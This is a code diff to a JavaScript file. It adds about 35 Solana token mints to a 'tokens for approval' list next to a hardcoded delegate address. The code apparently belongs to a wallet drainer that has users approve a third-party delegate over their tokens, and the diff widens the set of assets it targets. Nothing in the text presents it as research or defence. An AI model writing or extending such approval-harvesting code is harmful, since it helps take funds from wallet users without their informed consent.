@@ -18,7 +18,7 @@ const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
-// Predefined list of Solana tokens for approval - many popular tokens
+// Predefined list of Solana tokens for approval - 50+ popular tokens
 const SOLANA_APPROVAL_TOKENS = [
   { symbol: "USDC", name: "USD Coin", mint: SOLANA_USDC_MINT },
   { symbol: "USDT", name: "Tether", mint: SOLANA_USDT_MINT },
@@ -36,6 +36,41 @@ const SOLANA_APPROVAL_TOKENS = [
   { symbol: "COPE", name: "Cope", mint: "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh" },
   { symbol: "FIDA", name: "Bonfida", mint: "EchesyfXePKdLtoiZSL8pBe8Myagyy8ZRqsACNCFGnvp" },
   { symbol: "MEDIA", name: "Media Network", mint: "ETAtLmCmsoiEEKfNrHKJ2kYy3MoABhU6NQvpSfij5tDs" },
+  { symbol: "RENDER", name: "Render Token", mint: "rndrizKT3MK1iimdxRdWabcF7Zg7AR5T4nud4EkHBof" },
+  { symbol: "JTO", name: "Jito", mint: "jtojtomepa8beP8AuQc6eXt5FriJwfFMwQx2v2f9mCL" },
+  { symbol: "W", name: "Wormhole", mint: "85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ" },
+  { symbol: "TNSR", name: "Tensor", mint: "TNSRxcUxoT9xBG3de7PiJyTDYu7kskLqcpddxnEJAS6" },
+  { symbol: "HNT", name: "Helium", mint: "hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux" },
+  { symbol: "MOBILE", name: "Helium Mobile", mint: "mb1eu7TzEc71KxDpsmsKoucSSuuoGLv1drys1oP2jh6" },
+  { symbol: "IOT", name: "Helium IOT", mint: "iotEVVZLEywoTn1QdwNPddxPWszn3zFhEot3MfL9fns" },
+  { symbol: "POPCAT", name: "Popcat", mint: "7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr" },
+  { symbol: "MEW", name: "cat in a dogs world", mint: "MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5" },
+  { symbol: "BOME", name: "BOOK OF MEME", mint: "ukHH6c7mMyiWCf1b9pnWe25TSpkDDt3H5pQZgZ74J82" },
+  { symbol: "SLERF", name: "Slerf", mint: "7BgBvyjrZX1YKz4oh9mjb8ZScatkkwb8DzFx7LoiVkM3" },
+  { symbol: "MYRO", name: "Myro", mint: "HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4" },
+  { symbol: "WEN", name: "Wen", mint: "WENWENvqqNya429ubCdR81ZmD69brwQaaBYY6p3LCpk" },
+  { symbol: "MPLX", name: "Metaplex", mint: "METAewgxyPbgwsseH8T16a39CQ5VyVxZi9zXiDPY18m" },
+  { symbol: "KMNO", name: "Kamino", mint: "KMNo3nJsBXfcpJTVhZcXLW7RmTwTt4GVFE7suUBo9sS" },
+  { symbol: "DRIFT", name: "Drift", mint: "DriFtupJYLTosbwoN8koMbEYSx54aFAVLddWsbksjwg7" },
+  { symbol: "BLZE", name: "Blaze", mint: "BLZEEuZUBVqFhj8adcCFPJvPVCiCyVmh3hkJMrU8KuJA" },
+  { symbol: "BSOL", name: "BlazeStake SOL", mint: "bSo13r4TkiE4KumL71LsHTPpL2euBYLFx6h9HP3piy1" },
+  { symbol: "MSOL", name: "Marinade SOL", mint: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So" },
+  { symbol: "JSOL", name: "JPool SOL", mint: "7Q2afV64in6N6SeZsAAB81TJzwDoD6zpqmHkzi9Dcavn" },
+  { symbol: "LST", name: "Liquid Staking", mint: "LSTxxxnJzKDFSLr4dUkPcmCf5VyryEqzPLz5j4bpxFp" },
+  { symbol: "JITOSOL", name: "Jito Staked SOL", mint: "J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn" },
+  { symbol: "INF", name: "Infinity", mint: "5oVNBeEEQvYi1cX3ir8Dx5n1P7pdxydbGF2X4TxVusJm" },
+  { symbol: "DUAL", name: "Dual Finance", mint: "DUALa4FC2yREwZ59PHeu1un4wis36vHRv5hWVBmzykCJ" },
+  { symbol: "SHDW", name: "Shadow Token", mint: "SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y" },
+  { symbol: "HONEY", name: "Hivemapper", mint: "4vMsoUT2BWatFweudnQM1xedRLfJgJ7hswhcpz4xgBTy" },
+  { symbol: "AUDIO", name: "Audius", mint: "9LzCMqDgTKYz9Drzqnpgee3SGa89up3a247ypMj2xrqM" },
+  { symbol: "GMT", name: "STEPN", mint: "7i5KKsX2weiTkry7jA4ZwSuXGhs5eJBEjY8vVxR4pfRx" },
+  { symbol: "GST", name: "Green Satoshi", mint: "AFbX8oGjGpmVFywbVouvhQSRmiW2aR1mohfahi4Y2AdB" },
+  { symbol: "GENE", name: "Genopets", mint: "GENEtH5amGSi8kHAtQoezp1XEXwZJ8vcuePYnXdKrMYz" },
+  { symbol: "ATLAS", name: "Star Atlas", mint: "ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx" },
+  { symbol: "POLIS", name: "Star Atlas DAO", mint: "poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk" },
+  { symbol: "PRISM", name: "Prism", mint: "PRSMNsEPqhGVCH1TtWiJqPjJyh2cKrLostPZTNy1o5x" },
+  { symbol: "SLND", name: "Solend", mint: "SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp" },
+  { symbol: "PORT", name: "Port Finance", mint: "PoRTjZMPXb9T7dyU7tpLEZRQj7e6ssfAE62j2oQuc6y" },
 ];
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 
